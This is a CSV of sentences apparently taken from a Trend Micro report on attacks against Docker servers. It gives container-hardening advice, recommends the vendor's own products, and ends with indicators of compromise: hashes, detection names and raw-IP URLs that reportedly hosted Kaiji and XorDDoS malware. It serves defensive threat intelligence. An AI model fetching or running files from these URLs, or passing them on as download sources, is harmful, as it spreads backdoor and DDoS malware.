Number,Content
Sentence 34,"these are some recommendations for securing docker servers:

secure the container host."
Sentence 35,"take advantage of monitoring tools, and host containers in a container-focused os."
Sentence 36,secure the networking environment.
Sentence 37,use intrusion prevention system (ips) and web filtering to provide visibility and observe internal and external traffic.
Sentence 38,secure the management stack.
Sentence 39,monitor and secure the container registry and lock down the kubernetes installation.
Sentence 40,secure the build pipeline.
Sentence 41,implement a thorough and consistent access control scheme and install strong endpoint controls.
Sentence 42,adhere to the recommended best practices.
Sentence 43,use security tools to scan and secure containers.
Sentence 44,security solutions are recommended for safeguarding docker servers.
Sentence 45,"trend micro™ hybrid cloud security is recommended for automated security and protection for physical, virtual, and cloud workloads."
Sentence 46,"this solution encompasses the following:

trend micro cloud one™– for comprehensive visibility and protection against threats
trend micro cloud one - container security– for automated container image and registry scanning that helps detect threats early on
trend micro cloud one – workload security – for protecting new and existing workloads against even unknown threats using techniques such as machine learning and virtual patching
for security as software: trend micro deep security™ software (workload and container security) and trend micro deep security smart check (container image security) for scanning container images and preventing further compromise
"
Sentence 47,"
indicators of compromise
kaiji

file name	sha 256	trend micro pattern detection
123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a
linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a
related urls:

http://62.171.160.189/linux_arm
http://62.171.160.189/11/123.sh
xorddos and other malware variants found through the same url

sha 256	trend micro pattern detection
dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae
6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab
286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a
related url:

http://122.51.133.49:10086/vip"
